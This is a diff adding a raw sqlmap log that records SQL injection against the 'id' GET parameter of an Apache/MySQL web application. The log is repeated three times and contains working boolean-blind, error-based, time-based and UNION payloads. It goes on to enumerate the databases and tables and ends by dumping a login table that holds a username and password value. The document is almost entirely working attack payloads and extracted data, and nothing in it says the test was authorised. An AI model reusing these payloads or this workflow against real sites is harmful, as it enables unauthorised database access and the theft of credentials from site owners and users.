@@ -1,0 +1,105 @@
+sqlmap identified the following injection point(s) with a total of 55 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=57 AND 9456=9456
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=57 OR ROW(6186,1537)>(SELECT COUNT(*),CONCAT(0x717a707671,(SELECT (ELT(6186=6186,1))),0x71706b6a71,FLOOR(RAND(0)*2))x FROM (SELECT 3625 UNION SELECT 4756 UNION SELECT 8585 UNION SELECT 1753)a GROUP BY x)
+    Vector: OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=57 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-9128 UNION ALL SELECT NULL,NULL,CONCAT(0x717a707671,0x6648774a7364664470474d564b6a4f6a764c555977676a41714a4e614c7571706c6250486b6c5775,0x71706b6a71),NULL,NULL-- LtwY
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 4.1
+available databases [2]:
+[*] dwcm
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=57 AND 9456=9456
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=57 OR ROW(6186,1537)>(SELECT COUNT(*),CONCAT(0x717a707671,(SELECT (ELT(6186=6186,1))),0x71706b6a71,FLOOR(RAND(0)*2))x FROM (SELECT 3625 UNION SELECT 4756 UNION SELECT 8585 UNION SELECT 1753)a GROUP BY x)
+    Vector: OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=57 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-9128 UNION ALL SELECT NULL,NULL,CONCAT(0x717a707671,0x6648774a7364664470474d564b6a4f6a764c555977676a41714a4e614c7571706c6250486b6c5775,0x71706b6a71),NULL,NULL-- LtwY
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 4.1
+Database: dwcm
+[3 tables]
++-------------+
+| duvidas     |
+| informativo |
+| login       |
++-------------+
+
+Database: dwcm
++-------------+---------+
+| Table       | Entries |
++-------------+---------+
+| informativo | 52      |
+| duvidas     | 6       |
+| login       | 1       |
++-------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=57 AND 9456=9456
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=57 OR ROW(6186,1537)>(SELECT COUNT(*),CONCAT(0x717a707671,(SELECT (ELT(6186=6186,1))),0x71706b6a71,FLOOR(RAND(0)*2))x FROM (SELECT 3625 UNION SELECT 4756 UNION SELECT 8585 UNION SELECT 1753)a GROUP BY x)
+    Vector: OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=57 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-9128 UNION ALL SELECT NULL,NULL,CONCAT(0x717a707671,0x6648774a7364664470474d564b6a4f6a764c555977676a41714a4e614c7571706c6250486b6c5775,0x71706b6a71),NULL,NULL-- LtwY
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 4.1
+Database: dwcm
+Table: login
+[1 entry]
++----+-------+--------+
+| id | login | senha  |
++----+-------+--------+
+| 1  | dwcm  | TROCAR |
++----+-------+--------+
+
